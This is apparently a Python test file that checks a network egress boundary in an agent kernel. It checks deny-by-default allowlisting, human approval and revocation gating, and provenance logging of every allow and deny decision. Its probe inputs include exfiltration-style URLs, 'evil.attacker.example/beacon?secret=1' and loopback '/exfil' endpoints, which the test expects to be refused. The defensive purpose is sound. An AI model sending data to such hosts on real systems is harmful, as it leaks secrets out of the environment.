"""WIRE1 — the network egress boundary AT THE WIRE (heartbeat/decima/wire.py).

Phase 1 (Enforcement) mandate: "a network egress boundary — a mediating proxy
that enforces the `egress` allowlist at the wire, not just as a policy Cell."
EGRESS1 (checks/228) proved the POLICY; this check proves the CHOKEPOINT — the
place a socket would actually be created is gated, and the gate has teeth:

  (a) a real-transport construction routes THROUGH the gate: the only sanctioned
      path is `egress.live_transport` / `wire.real_transport`, and it demands a
      live egress CAPABILITY held in the acting agent's envelope — no capability,
      wrong cell, or missing grant → EgressDenied (no ambient authority);
  (b) DENY-BY-DEFAULT — an unallowlisted host is refused BEFORE any connection
      attempt (the injected socket seam is never reached), even when the
      capability is Morta-approved; an unapproved capability is refused too
      (a real outward connection is Morta-gated); cleartext http is refused;
  (c) an allowlisted, approved grant PERMITS — and the allow decision is already
      on the Weft (provenance: url, host, capability, decision) BEFORE the
      socket layer runs; denials are recorded the same way;
  (d) the BYPASS raises: with the guard armed (on `import decima`), a direct
      `urllib.request.urlopen` — the funnel every engine's default
      `_urllib_transport` goes through — raises EgressDenied at http_open/
      https_open, before DNS or any packet; an engine's raw default transport
      hits the same wall. Morta revocation closes the wire the same way.

Entirely OFFLINE: allowed calls run against an injected fake socket seam (the
gate still runs first), and bypass probes target loopback IP literals — the
guard raises before any connection is attempted; if the guard were removed the
probe would surface a URLError, not EgressDenied, and this check fails loud.

Contract: run(k, line). Fail loud via assert. Owns a fresh, offline Kernel.
"""
import os
import tempfile
import urllib.request

from decima.kernel import Kernel
from decima import egress, wire, ticketing


def run(k, line):
    line("\n== WIRE (egress enforced AT THE WIRE · deny-by-default · Morta · provenance) ==")
    kk = Kernel(os.path.join(tempfile.mkdtemp(), "weft.db"), fresh=True)

    # ── the boundary is on by default: importing decima armed the guard ──────
    assert wire.armed(), \
        "importing decima must arm the wire guard (the boundary is on by default)"

    # ── (d) BYPASS RAISES: ungated urlopen is stopped at the wire ────────────
    # Loopback IP literals: no DNS, no packet leaves the box. If the guard's
    # raise were removed, these would surface URLError (connection refused) —
    # NOT EgressDenied — and this check fails loud.
    for bypass in ("http://127.0.0.1:9/beacon", "https://127.0.0.1:9/exfil"):
        try:
            urllib.request.urlopen(bypass, timeout=1)
            raise AssertionError(f"ungated urlopen({bypass}) must raise EgressDenied")
        except wire.EgressDenied as e:
            assert "wire guard" in str(e), e
    # an engine's own default transport — a live-transport construction that
    # bypasses the gate — funnels through the same urlopen and hits the wall:
    try:
        ticketing._urllib_transport("https://127.0.0.1:9/tickets", {}, "{}")
        raise AssertionError("an engine's raw default transport must be stopped at the wire")
    except wire.EgressDenied:
        pass
    line("  (d) bypass raises: direct urlopen AND an engine's raw _urllib_transport are "
         "refused AT THE WIRE (no connection attempted) ✓")

    # ── the fake SOCKET seam (the gate runs before it; oracle stays offline) ──
    calls = []

    def fake_open(url, headers, body, method, timeout):
        # provenance-before-socket: by the time the socket layer runs, the ALLOW
        # decision must already be on the Weft.
        assert any(c.content.get("decision") == wire.ALLOW
                   and c.content.get("url") == url
                   for c in kk.weave().of_type(wire.WIRE_DECISION)), \
            "the allow decision must be recorded BEFORE the wire is touched"
        calls.append({"url": url, "method": method})
        return 200, {"ok": True}

    # ── install the egress capability (allowlist caveat) and build the gate ──
    cap_id, hosts = egress.install(kk, allowlist=["api.trusted.example"])
    agent = kk.weave().get(kk.decima_agent_id)   # re-read post-grant (envelope holds cap)
    t = egress.live_transport(kk, agent, cap_id, _open=fake_open)
    assert getattr(t, "wire_gated", False), "live_transport must come from the wire gate"

    def denied(url, needle):
        """The call must raise EgressDenied whose reason carries `needle`,
        WITHOUT reaching the socket seam, and the denial must be on the Weft."""
        n = len(calls)
        try:
            t(url, {}, "{}")
            raise AssertionError(f"egress to {url} must be denied ({needle})")
        except wire.EgressDenied as e:
            assert needle in str(e), (needle, str(e))
        assert len(calls) == n, f"denied egress must NEVER reach the socket ({url})"
        assert any(c.content.get("decision") == wire.DENY and needle in c.content.get("reason", "")
                   for c in kk.weave().of_type(wire.WIRE_DECISION)), \
            f"the denial ({needle}) must be recorded on the Weft with provenance"

    # ── (b) Morta gate: allowlisted host, but NO approval → refused ──────────
    denied("https://api.trusted.example/v1/ok", "Morta gate")
    line("  (b) Morta: an allowlisted host is still refused until the capability is "
         "human-approved (outward effects are Morta-gated) ✓")

    kk.approve(cap_id)                            # the human says yes — wire may open

    # ── (b) deny-by-default: unallowlisted host refused EVEN WHEN approved ───
    denied("https://evil.attacker.example/beacon?secret=1", "not on egress allowlist")
    denied("http://api.trusted.example/v1/ok", "cleartext")   # https-only at the wire
    line("  (b) deny-by-default: an unallowlisted host (and cleartext http) is refused "
         "BEFORE any connection attempt, approval notwithstanding ✓")

    # ── (c) an allowlisted, APPROVED grant permits — recorded with provenance ─
    status, payload = t("https://api.trusted.example/v1/ok", {"h": "1"}, '{"a":1}')
    assert (status, payload) == (200, {"ok": True}), (status, payload)
    assert len(calls) == 1 and calls[0]["url"] == "https://api.trusted.example/v1/ok", calls
    allows = [c for c in kk.weave().of_type(wire.WIRE_DECISION)
              if c.content.get("decision") == wire.ALLOW]
    assert len(allows) == 1, "exactly the one allowed connection is recorded"
    a = allows[0].content
    assert a["host"] == "api.trusted.example" and a["capability"] == cap_id, a
    assert a["url"] == "https://api.trusted.example/v1/ok", a
    assert a["instruction_eligible"] is False, "a wire decision is DATA, never an order"
    line(f"  (c) allowlisted + approved: permitted, and the allow decision "
         f"{allows[0].id[:10]} (url · host · capability) landed on the Weft BEFORE the "
         f"socket ran ✓")

    # ── (a) construction routes through the gate: no capability, no wire ─────
    for bad_cap in (None, allows[0].id):          # nothing, and a non-capability cell
        try:
            egress.live_transport(kk, agent, bad_cap, _open=fake_open)(
                "https://api.trusted.example/v1/ok", {}, "{}")
            raise AssertionError("a transport without an egress capability must be refused")
        except wire.EgressDenied as e:
            assert "no capability" in str(e), e
    assert len(calls) == 1, "no capability → the socket is never reached"
    line("  (a) no ambient authority: a real transport without a live egress capability "
         "grant raises at the gate ✓")

    # ── Morta revocation closes the wire (fail closed, recorded) ─────────────
    kk.revoke(cap_id)
    denied("https://api.trusted.example/v1/ok", "revoked")
    line("  Morta revocation: the very next call through the same transport is refused "
         "at the wire, and the refusal is on the Weft ✓")

    denies = [c for c in kk.weave().of_type(wire.WIRE_DECISION)
              if c.content.get("decision") == wire.DENY]
    assert len(denies) >= 4 and len(allows) == 1, (len(denies), len(allows))
    line(f"  provenance: {len(allows)} allow + {len(denies)} deny decisions folded from "
         f"the Weft — every wire decision is auditable ✓")
    line("  → the egress allowlist is enforced AT THE WIRE: deny-by-default, per-grant "
         "(no ambient authority), Morta-gated, every decision recorded; ungated "
         "urlopen raises. The boundary is a chokepoint, not a convention.")
